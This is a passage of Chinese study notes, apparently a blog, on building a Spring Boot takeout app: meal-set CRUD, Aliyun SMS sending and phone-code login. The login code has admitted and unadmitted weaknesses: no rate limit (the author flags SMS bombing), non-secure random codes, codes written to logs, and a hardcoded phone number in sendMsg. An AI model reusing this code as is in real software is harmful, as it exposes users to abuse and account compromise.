<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;/setmeal&quot;)</span><br><span class="line">@Slf4j</span><br><span class="line">public class SetmealController &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private SetmealDishService setmealDishService;</span><br><span class="line">    @Autowired</span><br><span class="line">    private SetmealService setmealService;</span><br><span class="line">    @PostMapping</span><br><span class="line">    public R&lt;String&gt; save(@RequestBody SetmealDto setmealDto)&#123;</span><br><span class="line">        log.info(&quot;套餐信息：&#123;&#125;&quot;,setmealDto);</span><br><span class="line"></span><br><span class="line">        setmealService.saveWithDish(setmealDto);</span><br><span class="line"></span><br><span class="line">        return R.success(&quot;新增套餐成功&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>serviceimpl代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetmealServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;SetmealMapper, Setmeal&gt; <span class="keyword">implements</span> <span class="title class_">SetmealService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SetmealDishService setmealDishService;</span><br><span class="line">    <span class="comment">//新增套餐，同时需要保存套餐和菜品的关联关系</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveWithDish</span><span class="params">(SetmealDto setmealDto)</span> &#123;</span><br><span class="line">        <span class="comment">//保存套餐的基本信息，操作setmeal，执行insert操作</span></span><br><span class="line">        <span class="built_in">this</span>.save(setmealDto);</span><br><span class="line"></span><br><span class="line">        List&lt;SetmealDish&gt; setmealDishes = setmealDto.getSetmealDishes();</span><br><span class="line">        setmealDishes.stream().map((item) -&gt; &#123;</span><br><span class="line">            item.setSetmealId(setmealDto.getId());</span><br><span class="line">            <span class="keyword">return</span> item;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保存套餐和菜品的关联信息，操作setmeal_dish,执行insert操作</span></span><br><span class="line">        setmealDishService.saveBatch(setmealDishes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="套餐信息分页查询"><a href="#套餐信息分页查询" class="headerlink" title="套餐信息分页查询"></a>套餐信息分页查询</h3><p>交互过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、页面(backend/page/combo/list.html)发送ajax请求，将分页查询参数(page、pageSize、name)提交到服务端，获取分页数据</span><br><span class="line">2、页面发送请求，请求服务端进行图片下载，用于页面图片展示</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Page&gt; <span class="title function_">page</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> pageSize, String name)</span>&#123;</span><br><span class="line">    <span class="comment">//分页构造器对象</span></span><br><span class="line">    Page&lt;Setmeal&gt; pageInfo = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page,pageSize);</span><br><span class="line">    Page&lt;SetmealDto&gt; dtoPage = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    LambdaQueryWrapper&lt;Setmeal&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//添加查询条件，根据name进行like模糊查询</span></span><br><span class="line">    queryWrapper.like(name != <span class="literal">null</span>,Setmeal::getName,name);</span><br><span class="line">    <span class="comment">//添加排序条件，根据更新时间降序排列</span></span><br><span class="line">    queryWrapper.orderByDesc(Setmeal::getUpdateTime);</span><br><span class="line"></span><br><span class="line">    setmealService.page(pageInfo,queryWrapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对象拷贝</span></span><br><span class="line">    BeanUtils.copyProperties(pageInfo,dtoPage,<span class="string">&quot;records&quot;</span>);</span><br><span class="line">    List&lt;Setmeal&gt; records = pageInfo.getRecords();</span><br><span class="line"></span><br><span class="line">    List&lt;SetmealDto&gt; list = records.stream().map((item) -&gt; &#123;</span><br><span class="line">        <span class="type">SetmealDto</span> <span class="variable">setmealDto</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetmealDto</span>();</span><br><span class="line">        <span class="comment">//对象拷贝</span></span><br><span class="line">        BeanUtils.copyProperties(item,setmealDto);</span><br><span class="line">        <span class="comment">//分类id</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">categoryId</span> <span class="operator">=</span> item.getCategoryId();</span><br><span class="line">        <span class="comment">//根据分类id查询分类对象</span></span><br><span class="line">        <span class="type">Category</span> <span class="variable">category</span> <span class="operator">=</span> categoryService.getById(categoryId);</span><br><span class="line">        <span class="keyword">if</span>(category != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//分类名称</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">categoryName</span> <span class="operator">=</span> category.getName();</span><br><span class="line">            setmealDto.setCategoryName(categoryName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> setmealDto;</span><br><span class="line">    &#125;).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    dtoPage.setRecords(list);</span><br><span class="line">    <span class="keyword">return</span> R.success(dtoPage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="删除套餐"><a href="#删除套餐" class="headerlink" title="删除套餐"></a>删除套餐</h3><p>分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在套餐管理列表页面点击删除按钮，可以删除对应的餐信息。也可以通过复选框选择多个套餐，点击批量删除按钮一次删除多个套餐。注意，对于状态为售卖中的套餐不能删除，需要先停售，然后才能删除。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<p>controller</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@DeleteMapping</span><br><span class="line">public R&lt;String&gt; delete(@RequestParam List&lt;Long&gt; ids)&#123;</span><br><span class="line">    log.info(&quot;ids:&#123;&#125;&quot;,ids);</span><br><span class="line"></span><br><span class="line">    setmealService.removeWithDish(ids);</span><br><span class="line"></span><br><span class="line">    return R.success(&quot;套餐数据删除成功&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>serviceImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeWithDish</span><span class="params">(List&lt;Long&gt; ids)</span> &#123;</span><br><span class="line">    <span class="comment">//select count(*) from setmeal where id in (1,2,3) and status = 1</span></span><br><span class="line">    <span class="comment">//查询套餐状态，确定是否可用删除</span></span><br><span class="line">    LambdaQueryWrapper&lt;Setmeal&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>();</span><br><span class="line">    queryWrapper.in(Setmeal::getId,ids);</span><br><span class="line">    queryWrapper.eq(Setmeal::getStatus,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="built_in">this</span>.count(queryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//如果不能删除，抛出一个业务异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;套餐正在售卖中，不能删除&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果可以删除，先删除套餐表中的数据---setmeal</span></span><br><span class="line">    <span class="built_in">this</span>.removeByIds(ids);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//delete from setmeal_dish where setmeal_id in (1,2,3)</span></span><br><span class="line">    LambdaQueryWrapper&lt;SetmealDish&gt; lambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    lambdaQueryWrapper.in(SetmealDish::getSetmealId,ids);</span><br><span class="line">    <span class="comment">//删除关系表中的数据----setmeal_dish</span></span><br><span class="line">    setmealDishService.remove(lambdaQueryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="短信发送"><a href="#短信发送" class="headerlink" title="短信发送"></a>短信发送</h3><p><a href="https://dysms.console.aliyun.com/domestic/text">短信服务 (aliyun.com)</a></p>
<p><a href="https://dysms.console.aliyun.com/quickstart?spm=api-workbench.api_explorer.0.0.345f30c3kc9yao">短信服务 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/m0_74759856/article/details/141363954">java调用阿里API接口发送短信(超详细，无脑一波撸)-CSDN博客</a></p>
<p>使用阿里云短信服务进行发送</p>
<p>具体开发步骤:1、导入maven坐标2、调用API</p>
<p>maven坐标</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-java-sdk-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-java-sdk-dysmsapi<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写的工具类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SMSUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 发送短信</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> signName 签名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> templateCode 模板</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> phoneNumbers 手机号</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> param 参数</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(String signName, String templateCode,String phoneNumbers,String param)</span>&#123;</span><br><span class="line">		<span class="type">DefaultProfile</span> <span class="variable">profile</span> <span class="operator">=</span> DefaultProfile.getProfile(<span class="string">&quot;cn-hangzhou&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">		<span class="type">IAcsClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAcsClient</span>(profile);</span><br><span class="line"></span><br><span class="line">		<span class="type">SendSmsRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SendSmsRequest</span>();</span><br><span class="line">		request.setSysRegionId(<span class="string">&quot;cn-hangzhou&quot;</span>);</span><br><span class="line">		request.setPhoneNumbers(phoneNumbers);</span><br><span class="line">		request.setSignName(signName);</span><br><span class="line">		request.setTemplateCode(templateCode);</span><br><span class="line">		request.setTemplateParam(<span class="string">&quot;&#123;\&quot;code\&quot;:\&quot;&quot;</span>+param+<span class="string">&quot;\&quot;&#125;&quot;</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="type">SendSmsResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.getAcsResponse(request);</span><br><span class="line">			System.out.println(<span class="string">&quot;短信发送成功&quot;</span>);</span><br><span class="line">		&#125;<span class="keyword">catch</span> (ClientException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ExtendWith(MockitoExtension.class)</span><br><span class="line">public class SendSmsTest &#123;</span><br><span class="line">    @Test</span><br><span class="line">    void sendTest()&#123;</span><br><span class="line">        SMSUtils.sendMessage(&quot;瑞吉外卖学习&quot;,&quot;SMS_472115146&quot;,&quot;18308250157&quot;,&quot;123654&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="手机验证码登录"><a href="#手机验证码登录" class="headerlink" title="手机验证码登录"></a>手机验证码登录</h3><p>交互过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、在登录页面(front/page/login.html)输入手机号，点击【获取验证码】按钮，页面发送ajax请求，在服务端调用短信服务API给指定手机号发送验证码短信</span><br><span class="line">2、在登录页面输入验证码，点击【登录】按钮，发送ajax请求，在服务端处理登录请求</span><br><span class="line"></span><br><span class="line">开发手机验证码登录功能，其实就是在服务端编写代码去处理前端页面发送的这2次请求即可</span><br></pre></td></tr></table></figure>

<p>准备工作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在开发业务功能前，先将需要用到的类和接口基本结构创建好</span><br><span class="line">实体类 User</span><br><span class="line">Mapper接口 UserMapper</span><br><span class="line">业务层接口 Userservice</span><br><span class="line">业务层实现类 User5ervicelmpl</span><br><span class="line">控制层 UserController</span><br><span class="line">工具类SMSUtils、ValidatecodeUtils</span><br></pre></td></tr></table></figure>

<p> 验证码工具类代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValidateCodeUtils</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 随机生成验证码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length 长度为4位或者6位</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title function_">generateValidateCode</span><span class="params">(<span class="type">int</span> length)</span>&#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">code</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(length == <span class="number">4</span>)&#123;</span><br><span class="line">            code = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">9999</span>);<span class="comment">//生成随机数，最大为9999</span></span><br><span class="line">            <span class="keyword">if</span>(code &lt; <span class="number">1000</span>)&#123;</span><br><span class="line">                code = code + <span class="number">1000</span>;<span class="comment">//保证随机数为4位数字</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(length == <span class="number">6</span>)&#123;</span><br><span class="line">            code = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">999999</span>);<span class="comment">//生成随机数，最大为999999</span></span><br><span class="line">            <span class="keyword">if</span>(code &lt; <span class="number">100000</span>)&#123;</span><br><span class="line">                code = code + <span class="number">100000</span>;<span class="comment">//保证随机数为6位数字</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;只能生成4位或6位数字验证码&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 随机生成指定长度字符串验证码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length 长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateValidateCode4String</span><span class="params">(<span class="type">int</span> length)</span>&#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rdm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">hash1</span> <span class="operator">=</span> Integer.toHexString(rdm.nextInt());</span><br><span class="line">        <span class="type">String</span> <span class="variable">capstr</span> <span class="operator">=</span> hash1.substring(<span class="number">0</span>, length);</span><br><span class="line">        <span class="keyword">return</span> capstr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改过滤器代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line"><span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、获取本次请求的URI</span></span><br><span class="line"><span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> request.getRequestURI();<span class="comment">// /backend/index.html</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;拦截到请求：&#123;&#125;&quot;</span>,requestURI);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义不需要处理的请求路径</span></span><br><span class="line">String[] urls = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;/employee/login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/employee/logout&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/backend/**&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/front/**&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/common/**&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/user/sendMsg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/user/login&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、判断本次请求是否需要处理</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">check</span> <span class="operator">=</span> check(urls, requestURI);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、如果不需要处理，则直接放行</span></span><br><span class="line"><span class="keyword">if</span>(check)&#123;</span><br><span class="line">    log.info(<span class="string">&quot;本次请求&#123;&#125;不需要处理&quot;</span>,requestURI);</span><br><span class="line">    filterChain.doFilter(request,response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4-1、判断登录状态，如果已登录，则直接放行</span></span><br><span class="line"><span class="keyword">if</span>(request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">    log.info(<span class="string">&quot;用户已登录，用户id为：&#123;&#125;&quot;</span>,request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">Long</span> <span class="variable">empId</span> <span class="operator">=</span> (Long) request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>);</span><br><span class="line">    BaseContext.setCurrentId(empId);</span><br><span class="line"></span><br><span class="line">    filterChain.doFilter(request,response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4-2、判断登录状态，如果已登录，则直接放行</span></span><br><span class="line"><span class="keyword">if</span>(request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">    log.info(<span class="string">&quot;用户已登录，用户id为：&#123;&#125;&quot;</span>,request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> (Long) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    BaseContext.setCurrentId(userId);</span><br><span class="line"></span><br><span class="line">    filterChain.doFilter(request,response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;用户未登录&quot;</span>);</span><br><span class="line"><span class="comment">//5、如果未登录则返回未登录结果，通过输出流方式向客户端页面响应数据</span></span><br><span class="line">response.getWriter().write(JSON.toJSONString(R.error(<span class="string">&quot;NOTLOGIN&quot;</span>)));</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<p>修改前端代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//login.js</span><br><span class="line">function sendMsgApi(data) &#123;</span><br><span class="line">    return $axios(&#123;</span><br><span class="line">        &#x27;url&#x27;: &#x27;/user/sendMsg&#x27;,</span><br><span class="line">        &#x27;method&#x27;: &#x27;post&#x27;,</span><br><span class="line">        data</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">//login.html</span><br><span class="line">getCode()&#123;</span><br><span class="line">    this.form.code = &#x27;&#x27;</span><br><span class="line">    const regex = /^(13[0-9]&#123;9&#125;)|(15[0-9]&#123;9&#125;)|(17[0-9]&#123;9&#125;)|(18[0-9]&#123;9&#125;)|(19[0-9]&#123;9&#125;)$/;</span><br><span class="line">    if (regex.test(this.form.phone)) &#123;</span><br><span class="line">    this.msgFlag = false</span><br><span class="line">    // this.form.code = (Math.random()*1000000).toFixed(0)</span><br><span class="line">    sendMsgApi(&#123;phone:this.form.phone&#125;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    this.msgFlag = true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">async btnLogin()&#123;</span><br><span class="line">    if(this.form.phone &amp;&amp; this.form.code)&#123;</span><br><span class="line">    this.loading = true</span><br><span class="line">    const res = await loginApi(&#123;phone:this.form.phone, code:this.form.code&#125;)//修改的地方</span><br><span class="line">    this.loading = false</span><br><span class="line">    if(res.code === 1)&#123;</span><br><span class="line">    sessionStorage.setItem(&quot;userPhone&quot;,this.form.phone)</span><br><span class="line">    window.requestAnimationFrame(()=&gt;&#123;</span><br><span class="line">    window.location.href= &#x27;/front/index.html&#x27;</span><br><span class="line">    &#125;)                           </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    this.$notify(&#123; type:&#x27;warning&#x27;, message:res.msg&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    this.$notify(&#123; type:&#x27;warning&#x27;, message:&#x27;请输入手机号码&#x27;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>短信发送代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/sendMsg&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">sendMsg</span><span class="params">(<span class="meta">@RequestBody</span> User user, HttpSession session)</span>&#123;</span><br><span class="line">    <span class="comment">//获取手机号</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> user.getPhone();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotEmpty(phone))&#123;</span><br><span class="line">        <span class="comment">//生成随机的4位验证码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> ValidateCodeUtils.generateValidateCode(<span class="number">6</span>).toString();</span><br><span class="line">        log.info(<span class="string">&quot;code=&#123;&#125;&quot;</span>,code);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用阿里云提供的短信服务API完成发送短信</span></span><br><span class="line">        SMSUtils.sendMessage(<span class="string">&quot;瑞吉外卖学习&quot;</span>,<span class="string">&quot;SMS_472115146&quot;</span>,<span class="string">&quot;18308250157&quot;</span>,code);</span><br><span class="line">        <span class="comment">//需要将生成的验证码保存到Session</span></span><br><span class="line">        session.setAttribute(phone,code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> R.success(<span class="string">&quot;手机验证码短信发送成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> R.error(<span class="string">&quot;短信发送失败&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有bug，用户可以一直点击发送验证码，短信轰炸。todo：视频看完后改（可能之后视频会改，没改的话我们就自己改）</p>
<p>登录代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;User&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestBody</span> Map map, HttpSession session)</span>&#123;</span><br><span class="line">        log.info(map.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取手机号</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> map.get(<span class="string">&quot;phone&quot;</span>).toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取验证码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> map.get(<span class="string">&quot;code&quot;</span>).toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从Session中获取保存的验证码</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">codeInSession</span> <span class="operator">=</span> session.getAttribute(phone);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行验证码的比对（页面提交的验证码和Session中保存的验证码比对）</span></span><br><span class="line">        <span class="keyword">if</span>(codeInSession != <span class="literal">null</span> &amp;&amp; codeInSession.equals(code))&#123;</span><br><span class="line">            <span class="comment">//如果能够比对成功，说明登录成功</span></span><br><span class="line"></span><br><span class="line">            LambdaQueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">            queryWrapper.eq(User::getPhone,phone);</span><br><span class="line"></span><br><span class="line">            <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.getOne(queryWrapper);</span><br><span class="line">            <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">//判断当前手机号对应的用户是否为新用户，如果是新用户就自动完成注册</span></span><br><span class="line">                user = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                user.setPhone(phone);</span><br><span class="line">                user.setStatus(<span class="number">1</span>);</span><br><span class="line">                userService.save(user);</span><br><span class="line">            &#125;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;user&quot;</span>,user.getId());</span><br><span class="line">            <span class="keyword">return</span> R.success(user);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>使用map接收</p>
<h3 id="导入用户地址簿"><a href="#导入用户地址簿" class="headerlink" title="导入用户地址簿"></a>导入用户地址簿</h3><p>需求分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">地址簿，指的是移动端消费者用户的地址信息，用户登录成功后可以维护自己的地址信息。同一个用户可以有多个地址信息，但是只能有一个默认地址。</span><br></pre></td></tr></table></figure>

<p>功能代码清单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体类 AddressBook</span><br><span class="line">Mapper接口 AddressBookMapper</span><br><span class="line">业务层接口 AddressBookService</span><br><span class="line">业务层实现类 AddressBookServiceImpl</span><br><span class="line">控制层 AddressBookController</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/addressBook&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddressBookController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AddressBookService addressBookService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新增</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;AddressBook&gt; <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> AddressBook addressBook)</span> &#123;</span><br><span class="line">        addressBook.setUserId(BaseContext.getCurrentId());</span><br><span class="line">        log.info(<span class="string">&quot;addressBook:&#123;&#125;&quot;</span>, addressBook);</span><br><span class="line">        addressBookService.save(addressBook);</span><br><span class="line">        <span class="keyword">return</span> R.success(addressBook);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 